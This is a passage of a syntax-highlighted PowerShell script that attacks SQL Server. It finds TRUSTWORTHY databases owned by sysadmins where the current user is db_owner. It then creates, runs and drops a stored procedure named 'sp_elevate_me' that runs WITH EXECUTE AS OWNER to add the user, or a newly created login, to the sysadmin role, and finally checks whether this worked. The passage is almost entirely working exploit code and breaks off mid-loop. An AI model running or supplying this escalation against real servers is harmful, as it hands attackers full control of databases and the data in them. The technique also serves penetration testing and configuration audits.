<span class="w">    </span><span class="k">if</span><span class="p">(</span>$<span class="n">SqlUser</span><span class="w"> </span><span class="o">-</span><span class="n">and</span><span class="w"> </span>$<span class="n">SqlPass</span><span class="p">){</span>

<span class="w">        </span>#<span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">login</span>
<span class="w">        </span>$<span class="n">conn</span><span class="p">.</span><span class="n">ConnectionString</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;Server=$SqlServerInstance;Database=master;User ID=$SqlUser;Password=$SqlPass;&quot;</span>
<span class="w">        </span><span class="p">[</span><span class="nb">string</span><span class="p">]</span>$<span class="n">ConnectUser</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">SqlUser</span>
<span class="w">    </span><span class="p">}</span><span class="k">else</span><span class="p">{</span>

<span class="w">        </span>#<span class="w"> </span><span class="n">Trusted</span><span class="w"> </span><span class="n">connection</span>
<span class="w">        </span>$<span class="n">conn</span><span class="p">.</span><span class="n">ConnectionString</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;Server=$SqlServerInstance;Database=master;Integrated Security=SSPI;&quot;</span>
<span class="w">        </span>$<span class="n">UserDomain</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="p">[</span><span class="n">Environment</span><span class="p">]::</span><span class="n">UserDomainName</span>
<span class="w">        </span>$<span class="n">Username</span><span class="w"> </span><span class="p">=</span><span class="w">  </span><span class="p">[</span><span class="n">Environment</span><span class="p">]::</span><span class="n">UserName</span>
<span class="w">        </span>$<span class="n">ConnectUser</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;$UserDomain\$Username&quot;</span>

<span class="w">    </span><span class="p">}</span>

<span class="w">    </span>#<span class="w"> </span><span class="n">Status</span><span class="w"> </span><span class="n">User</span>
<span class="w">    </span><span class="nb">write</span><span class="o">-</span><span class="n">host</span><span class="w"> </span><span class="s">&quot;[*] Attempting to Connect to $SqlServerInstance as $ConnectUser...&quot;</span>

<span class="w">    </span>#<span class="w"> </span><span class="n">Attempt</span><span class="w"> </span><span class="n">database</span><span class="w"> </span><span class="n">connection</span>
<span class="w">    </span><span class="k">try</span><span class="p">{</span>
<span class="w">        </span>$<span class="n">conn</span><span class="p">.</span><span class="n">Open</span><span class="p">()</span>
<span class="w">        </span><span class="nb">write</span><span class="o">-</span><span class="n">host</span><span class="w"> </span><span class="s">&quot;[*] Connected.&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">foreground</span><span class="w"> </span><span class="s">&quot;green&quot;</span>
<span class="w">    </span><span class="p">}</span><span class="k">catch</span><span class="p">{</span>
<span class="w">        </span>$<span class="n">ErrorMessage</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">_</span><span class="p">.</span><span class="n">Exception</span><span class="p">.</span><span class="n">Message</span>
<span class="w">        </span><span class="nb">write</span><span class="o">-</span><span class="n">host</span><span class="w"> </span><span class="s">&quot;[*] Connection failed&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">foreground</span><span class="w"> </span><span class="s">&quot;red&quot;</span>
<span class="w">        </span><span class="nb">write</span><span class="o">-</span><span class="n">host</span><span class="w"> </span><span class="s">&quot;[*] Error: $ErrorMessage&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">foreground</span><span class="w"> </span><span class="s">&quot;red&quot;</span><span class="w">  </span>
<span class="w">        </span><span class="n">Break</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span>#<span class="w"> </span><span class="o">-----------------------------------------------</span>
<span class="w">    </span>#<span class="w"> </span><span class="n">Create</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="n">tables</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">later</span>
<span class="w">    </span>#<span class="w"> </span><span class="o">-----------------------------------------------</span>

<span class="w">    </span>#<span class="w"> </span><span class="n">Create</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="nb">table</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">house</span><span class="w"> </span><span class="n">list</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">trusted</span><span class="w"> </span><span class="n">databases</span><span class="w"> </span><span class="n">owned</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">sysadmin</span><span class="w">  </span>
<span class="w">    </span>$<span class="n">IsSysAdmin</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">New</span><span class="o">-</span><span class="n">Object</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="n">Data</span><span class="p">.</span><span class="n">DataTable</span>
<span class="w">    </span>$<span class="n">TableDatabases</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">New</span><span class="o">-</span><span class="n">Object</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="n">Data</span><span class="p">.</span><span class="n">DataTable</span><span class="w"> </span>
<span class="w">    </span>$<span class="n">TableDBOwner</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">New</span><span class="o">-</span><span class="n">Object</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="n">Data</span><span class="p">.</span><span class="n">DataTable</span><span class="w"> </span>
<span class="w">    </span>$<span class="n">CheckforSysadmin</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">New</span><span class="o">-</span><span class="n">Object</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="n">Data</span><span class="p">.</span><span class="n">DataTable</span>

<span class="w">    </span>#<span class="w"> </span><span class="o">-----------------------------------------------</span>
<span class="w">    </span>#<span class="w"> </span><span class="n">Check</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">already</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">sysadmin</span>
<span class="w">    </span>#<span class="w"> </span><span class="o">-----------------------------------------------</span>
<span class="w">    </span>$<span class="n">QueryElevate</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;select is_srvrolemember(&#39;sysadmin&#39;) as IsSysAdmin&quot;</span>
<span class="w">    </span>$<span class="n">cmd</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">New</span><span class="o">-</span><span class="n">Object</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="n">Data</span><span class="p">.</span><span class="n">SqlClient</span><span class="p">.</span><span class="n">SqlCommand</span><span class="p">(</span>$<span class="n">QueryElevate</span><span class="p">,</span>$<span class="n">conn</span><span class="p">)</span>
<span class="w">    </span>$<span class="n">results</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">cmd</span><span class="p">.</span><span class="n">ExecuteReader</span><span class="p">()</span><span class="w"> </span>
<span class="w">    </span>$<span class="n">IsSysAdmin</span><span class="p">.</span><span class="n">Load</span><span class="p">(</span>$<span class="n">results</span><span class="p">)</span><span class="w"> </span>
<span class="w">    </span>$<span class="n">conn</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span><span class="w"> </span>
<span class="w">    </span>$<span class="n">IsSysAdmin</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="o">-</span><span class="n">Object</span><span class="w"> </span><span class="o">-</span><span class="n">First</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">IsSysAdmin</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">foreach</span><span class="w"> </span><span class="p">{</span>

<span class="w">        </span>$<span class="n">Checksysadmin</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">_</span><span class="p">.</span><span class="n">IsSysAdmin</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span>$<span class="n">Checksysadmin</span><span class="w"> </span><span class="o">-</span><span class="n">ne</span><span class="w"> </span><span class="mi">0</span><span class="p">){</span>
<span class="w">                </span><span class="nb">write</span><span class="o">-</span><span class="n">host</span><span class="w"> </span><span class="s">&quot;[*] You&#39;re already a sysadmin - no escalation needed.&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">foreground</span><span class="w"> </span><span class="s">&quot;green&quot;</span>
<span class="w">                </span><span class="n">Break</span><span class="w">             </span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span>#<span class="w"> </span><span class="o">-----------------------------------------------</span>
<span class="w">    </span>#<span class="w"> </span><span class="n">Get</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">list</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">trusted</span><span class="w"> </span><span class="n">databases</span><span class="w"> </span><span class="n">owned</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">sysadmin</span><span class="w"> </span>
<span class="w">    </span>#<span class="w"> </span><span class="o">-----------------------------------------------</span>

<span class="w">    </span>#<span class="w"> </span><span class="n">Setup</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">grab</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">list</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">accessible</span><span class="w"> </span><span class="n">databases</span>
<span class="w">    </span>$<span class="n">QueryDatabases</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;SELECT d.name AS DATABASENAME </span>
<span class="s">    FROM sys.server_principals r </span>
<span class="s">    INNER JOIN sys.server_role_members m ON r.principal_id = m.role_principal_id </span>
<span class="s">    INNER JOIN sys.server_principals p ON </span>
<span class="s">    p.principal_id = m.member_principal_id </span>
<span class="s">    inner join sys.databases d on suser_sname(d.owner_sid) = p.name </span>
<span class="s">    WHERE is_trustworthy_on = 1 AND d.name NOT IN (&#39;MSDB&#39;) and r.type = &#39;R&#39; and r.name = N&#39;sysadmin&#39;&quot;</span>

<span class="w">    </span>#<span class="w"> </span><span class="n">User</span><span class="w"> </span><span class="n">status</span>
<span class="w">    </span><span class="nb">write</span><span class="o">-</span><span class="n">host</span><span class="w"> </span><span class="s">&quot;[*] Enumerating accessible trusted databases owned by sysadmins...&quot;</span>

<span class="w">    </span>#<span class="w"> </span><span class="n">Query</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">databases</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="nb">load</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="n">into</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">TableDatabases</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="nb">table</span><span class="w"> </span><span class="n">object</span>
<span class="w">    </span>$<span class="n">conn</span><span class="p">.</span><span class="n">Open</span><span class="p">()</span>
<span class="w">    </span>$<span class="n">cmd</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">New</span><span class="o">-</span><span class="n">Object</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="n">Data</span><span class="p">.</span><span class="n">SqlClient</span><span class="p">.</span><span class="n">SqlCommand</span><span class="p">(</span>$<span class="n">QueryDatabases</span><span class="p">,</span>$<span class="n">conn</span><span class="p">)</span>
<span class="w">    </span>$<span class="n">results</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">cmd</span><span class="p">.</span><span class="n">ExecuteReader</span><span class="p">()</span>
<span class="w">    </span>$<span class="n">TableDatabases</span><span class="p">.</span><span class="n">Load</span><span class="p">(</span>$<span class="n">results</span><span class="p">)</span>

<span class="w">    </span>#<span class="w"> </span><span class="n">Check</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="nb">any</span><span class="w"> </span><span class="n">accessible</span><span class="w"> </span><span class="n">databases</span><span class="w"> </span><span class="n">where</span><span class="w"> </span><span class="n">found</span><span class="w"> </span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span>$<span class="n">TableDatabases</span><span class="p">.</span><span class="n">rows</span><span class="p">.</span><span class="n">count</span><span class="w"> </span><span class="o">-</span><span class="nb">eq</span><span class="w"> </span><span class="mi">0</span><span class="p">){</span>

<span class="w">        </span><span class="nb">write</span><span class="o">-</span><span class="n">host</span><span class="w"> </span><span class="s">&quot;[*] No accessible databases found.&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">foreground</span><span class="w"> </span><span class="s">&quot;red&quot;</span>
<span class="w">        </span><span class="n">Break</span>
<span class="w">    </span><span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="w">        </span>$<span class="n">DbCount</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">TableDatabases</span><span class="p">.</span><span class="n">rows</span><span class="p">.</span><span class="n">count</span><span class="w">      </span>
<span class="w">        </span><span class="nb">write</span><span class="o">-</span><span class="n">host</span><span class="w"> </span><span class="s">&quot;[*] Found $DbCount trusted databases owned by a sysadmin.&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">foreground</span><span class="w"> </span><span class="s">&quot;green&quot;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span>#<span class="w"> </span><span class="o">-------------------------------------------------</span>
<span class="w">    </span>#<span class="w"> </span><span class="n">Check</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">current</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">db_owner</span><span class="w"> </span><span class="n">role</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="nb">any</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">them</span>
<span class="w">    </span>#<span class="w"> </span><span class="o">-------------------------------------------------</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span>$<span class="n">TableDatabases</span><span class="p">.</span><span class="n">rows</span><span class="p">.</span><span class="n">count</span><span class="w"> </span><span class="o">-</span><span class="n">ne</span><span class="w"> </span><span class="mi">0</span><span class="p">){</span>

<span class="w">        </span><span class="nb">write</span><span class="o">-</span><span class="n">host</span><span class="w"> </span><span class="s">&quot;[*] Checking if $ConnectUser has the db_owner role in any of them...&quot;</span>
<span class="w">        </span>$<span class="n">TableDatabases</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">foreach</span><span class="w"> </span><span class="p">{</span>

<span class="w">        </span><span class="p">[</span><span class="nb">string</span><span class="p">]</span>$<span class="n">CurrentDatabase</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">_</span><span class="p">.</span><span class="n">databasename</span>

<span class="w">        </span>#<span class="w"> </span><span class="n">Setup</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">grab</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">list</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">databases</span>
<span class="w">        </span>$<span class="n">QueryProcedures</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;use $CurrentDatabase;select db_name() as db,rp.name as database_role, mp.name as database_user</span>
<span class="s">            from [$CurrentDatabase].sys.database_role_members drm</span>
<span class="s">            join [$CurrentDatabase].sys.database_principals rp on (drm.role_principal_id = rp.principal_id)</span>
<span class="s">            join [$CurrentDatabase].sys.database_principals mp on (drm.member_principal_id = mp.principal_id) </span>
<span class="s">            where rp.name = &#39;db_owner&#39; and mp.name = SYSTEM_USER&quot;</span>

<span class="w">            </span>#<span class="w"> </span><span class="n">Query</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">databases</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="nb">load</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="n">into</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">TableDatabase</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="nb">table</span><span class="w"> </span><span class="n">object</span>
<span class="w">            </span>$<span class="n">cmd</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">New</span><span class="o">-</span><span class="n">Object</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="n">Data</span><span class="p">.</span><span class="n">SqlClient</span><span class="p">.</span><span class="n">SqlCommand</span><span class="p">(</span>$<span class="n">QueryProcedures</span><span class="p">,</span>$<span class="n">conn</span><span class="p">)</span>
<span class="w">            </span><span class="n">Try</span><span class="p">{</span>
<span class="w">                </span>$<span class="n">results2</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">cmd</span><span class="p">.</span><span class="n">ExecuteReader</span><span class="p">()</span>
<span class="w">                </span>$<span class="n">TableDBOwner</span><span class="p">.</span><span class="n">Load</span><span class="p">(</span>$<span class="n">results2</span><span class="p">)</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">            </span><span class="n">Catch</span><span class="w"> </span><span class="p">{}</span>

<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span>#<span class="w"> </span><span class="o">-------------------------------------------------</span>
<span class="w">    </span>#<span class="w"> </span><span class="n">Attempt</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">escalate</span><span class="w"> </span><span class="n">privileges</span>
<span class="w">    </span>#<span class="w"> </span><span class="o">-------------------------------------------------</span>

<span class="w">    </span>#<span class="w"> </span><span class="n">Get</span><span class="w"> </span><span class="n">number</span><span class="w"> </span><span class="n">database</span><span class="w"> </span><span class="n">wwhere</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">db_owner</span>
<span class="w">    </span>$<span class="n">DbOwnerRoleCount</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">TableDBOwner</span><span class="p">.</span><span class="n">rows</span><span class="p">.</span><span class="n">count</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span>$<span class="n">DbOwnerRoleCount</span><span class="w"> </span><span class="o">-</span><span class="n">ne</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>

<span class="w">        </span>#<span class="w"> </span><span class="n">Set</span><span class="w"> </span><span class="n">db</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">used</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">escalating</span><span class="w"> </span><span class="n">privs</span><span class="w"> </span>#<span class="w"> </span><span class="nb">fix</span><span class="w"> </span><span class="n">this</span>
<span class="w">        </span>$<span class="n">TableDBOwner</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="o">-</span><span class="n">Object</span><span class="w"> </span><span class="n">db</span><span class="w"> </span><span class="o">-</span><span class="n">first</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">foreach</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span>$<span class="n">ElevateOnDb</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">_</span><span class="p">.</span><span class="n">db</span><span class="w">            </span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span>#<span class="w"> </span><span class="n">Add</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">provided</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span>$<span class="n">newuser</span><span class="w"> </span><span class="o">-</span><span class="n">and</span><span class="w"> </span>$<span class="n">newPass</span><span class="p">){</span>
<span class="w">            </span>$<span class="n">AddUser</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;CREATE LOGIN $newuser WITH PASSWORD = &#39;$newPass&#39;&quot;</span>
<span class="w">            </span>$<span class="n">UsertoElevate</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">newuser</span>
<span class="w">            </span>$<span class="n">Message</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot; create and&quot;</span>
<span class="w">        </span><span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="w">            </span>$<span class="n">AddUser</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;&quot;</span>
<span class="w">            </span>$<span class="n">UsertoElevate</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">ConnectUser</span>
<span class="w">            </span>$<span class="n">Message</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;&quot;</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span>#<span class="w"> </span><span class="n">Status</span><span class="w"> </span><span class="n">user</span>
<span class="w">        </span><span class="nb">write</span><span class="o">-</span><span class="n">host</span><span class="w"> </span><span class="s">&quot;[*] $ConnectUser has db_owner role in $DbOwnerRoleCount of the databases.&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">foreground</span><span class="w"> </span><span class="s">&quot;green&quot;</span>
<span class="w">        </span><span class="nb">write</span><span class="o">-</span><span class="n">host</span><span class="w"> </span><span class="s">&quot;[*] Attempting to$Message add $UsertoElevate to the sysadmin role via the $ElevateOnDb database...&quot;</span>

<span class="w">        </span>#<span class="w"> </span><span class="n">Set</span><span class="w"> </span><span class="n">authentication</span><span class="w"> </span><span class="nb">type</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">create</span><span class="w"> </span><span class="n">connection</span><span class="w"> </span><span class="nb">string</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">targeted</span><span class="w"> </span><span class="n">database</span><span class="w"> </span>
<span class="w">        </span><span class="k">if</span><span class="p">(</span>$<span class="n">SqlUser</span><span class="w"> </span><span class="o">-</span><span class="n">and</span><span class="w"> </span>$<span class="n">SqlPass</span><span class="p">){</span>

<span class="w">            </span>#<span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">login</span>
<span class="w">            </span>$<span class="n">conn</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
<span class="w">            </span>$<span class="n">conn</span><span class="p">.</span><span class="n">ConnectionString</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;Server=$SqlServerInstance;Database=$ElevateOnDb;User ID=$SqlUser;Password=$SqlPass;&quot;</span>
<span class="w">            </span><span class="p">[</span><span class="nb">string</span><span class="p">]</span>$<span class="n">ConnectUser</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">SqlUser</span>
<span class="w">        </span><span class="p">}</span><span class="k">else</span><span class="p">{</span>

<span class="w">            </span>#<span class="w"> </span><span class="n">Trusted</span><span class="w"> </span><span class="n">connection</span>
<span class="w">            </span>$<span class="n">conn</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
<span class="w">            </span>$<span class="n">conn</span><span class="p">.</span><span class="n">ConnectionString</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;Server=$SqlServerInstance;Database=$ElevateOnDb;Integrated Security=SSPI;&quot;</span>
<span class="w">            </span>$<span class="n">UserDomain</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="p">[</span><span class="n">Environment</span><span class="p">]::</span><span class="n">UserDomainName</span>
<span class="w">            </span>$<span class="n">Username</span><span class="w"> </span><span class="p">=</span><span class="w">  </span><span class="p">[</span><span class="n">Environment</span><span class="p">]::</span><span class="n">UserName</span>
<span class="w">            </span>$<span class="n">ConnectUser</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;$UserDomain\$Username&quot;</span>

<span class="w">        </span><span class="p">}</span>

<span class="w">    </span>#<span class="w"> </span><span class="n">Create</span><span class="w"> </span><span class="n">stored</span><span class="w"> </span><span class="n">procedures</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">escalate</span><span class="w"> </span><span class="n">privileges</span>
<span class="w">        </span>$<span class="n">conn</span><span class="p">.</span><span class="n">Open</span><span class="p">()</span>
<span class="w">        </span>$<span class="n">QueryElevate</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;CREATE PROCEDURE sp_elevate_me</span>
<span class="s">        WITH EXECUTE AS OWNER</span>
<span class="s">        AS</span>
<span class="s">        begin</span>
<span class="s">        $AddUser</span>
<span class="s">        EXEC sp_addsrvrolemember &#39;$UsertoElevate&#39;,&#39;sysadmin&#39;</span>
<span class="s">        end&quot;</span>
<span class="w">    </span>$<span class="n">cmd</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">New</span><span class="o">-</span><span class="n">Object</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="n">Data</span><span class="p">.</span><span class="n">SqlClient</span><span class="p">.</span><span class="n">SqlCommand</span><span class="p">(</span>$<span class="n">QueryElevate</span><span class="p">,</span>$<span class="n">conn</span><span class="p">)</span>
<span class="w">    </span>$<span class="n">results</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">cmd</span><span class="p">.</span><span class="n">ExecuteReader</span><span class="p">()</span><span class="w"> </span>
<span class="w">        </span>$<span class="n">conn</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>

<span class="w">    </span>#<span class="w"> </span><span class="nb">Execute</span><span class="w"> </span><span class="n">stored</span><span class="w"> </span><span class="n">procedures</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">escalate</span><span class="w"> </span><span class="n">privileges</span>
<span class="w">        </span>$<span class="n">conn</span><span class="p">.</span><span class="n">Open</span><span class="p">()</span>
<span class="w">        </span>$<span class="n">QueryElevate</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;EXEC sp_elevate_me&quot;</span>
<span class="w">    </span>$<span class="n">cmd</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">New</span><span class="o">-</span><span class="n">Object</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="n">Data</span><span class="p">.</span><span class="n">SqlClient</span><span class="p">.</span><span class="n">SqlCommand</span><span class="p">(</span>$<span class="n">QueryElevate</span><span class="p">,</span>$<span class="n">conn</span><span class="p">)</span>
<span class="w">    </span>$<span class="n">results</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">cmd</span><span class="p">.</span><span class="n">ExecuteReader</span><span class="p">()</span><span class="w"> </span>
<span class="w">        </span>$<span class="n">conn</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>

<span class="w">    </span>#<span class="w"> </span><span class="nb">Remove</span><span class="w"> </span><span class="n">stored</span><span class="w"> </span><span class="n">procedure</span>
<span class="w">        </span>$<span class="n">conn</span><span class="p">.</span><span class="n">Open</span><span class="p">()</span>
<span class="w">        </span>$<span class="n">QueryElevate</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;drop proc sp_elevate_me&quot;</span>
<span class="w">    </span>$<span class="n">cmd</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">New</span><span class="o">-</span><span class="n">Object</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="n">Data</span><span class="p">.</span><span class="n">SqlClient</span><span class="p">.</span><span class="n">SqlCommand</span><span class="p">(</span>$<span class="n">QueryElevate</span><span class="p">,</span>$<span class="n">conn</span><span class="p">)</span>
<span class="w">    </span>$<span class="n">results</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">cmd</span><span class="p">.</span><span class="n">ExecuteReader</span><span class="p">()</span><span class="w"> </span>
<span class="w">        </span>$<span class="n">conn</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>

<span class="w">    </span>#<span class="w"> </span><span class="n">Verify</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">privilege</span><span class="w"> </span><span class="n">escalation</span><span class="w"> </span><span class="n">works</span>
<span class="w">        </span><span class="n">If</span><span class="w"> </span><span class="p">(</span><span class="o">-</span><span class="n">Not</span><span class="w"> </span><span class="p">(</span>$<span class="n">newuser</span><span class="w"> </span><span class="o">-</span><span class="n">and</span><span class="w"> </span>$<span class="n">newPass</span><span class="p">)){</span>
<span class="w">            </span>$<span class="n">conn</span><span class="p">.</span><span class="n">Open</span><span class="p">()</span>
<span class="w">            </span>$<span class="n">QueryElevate</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;select is_srvrolemember(&#39;sysadmin&#39;) as IsSysAdmin&quot;</span>
<span class="w">            </span>$<span class="n">cmd</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">New</span><span class="o">-</span><span class="n">Object</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="n">Data</span><span class="p">.</span><span class="n">SqlClient</span><span class="p">.</span><span class="n">SqlCommand</span><span class="p">(</span>$<span class="n">QueryElevate</span><span class="p">,</span>$<span class="n">conn</span><span class="p">)</span>
<span class="w">            </span>$<span class="n">results</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">cmd</span><span class="p">.</span><span class="n">ExecuteReader</span><span class="p">()</span><span class="w"> </span>
<span class="w">            </span>$<span class="n">CheckforSysadmin</span><span class="p">.</span><span class="n">Load</span><span class="p">(</span>$<span class="n">results</span><span class="p">)</span><span class="w"> </span>
<span class="w">            </span>$<span class="n">conn</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>

<span class="w">            </span>$<span class="n">CheckforSysadmin</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="o">-</span><span class="n">Object</span><span class="w"> </span><span class="o">-</span><span class="n">First</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">IsSysAdmin</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">foreach</span><span class="w"> </span><span class="p">{</span>

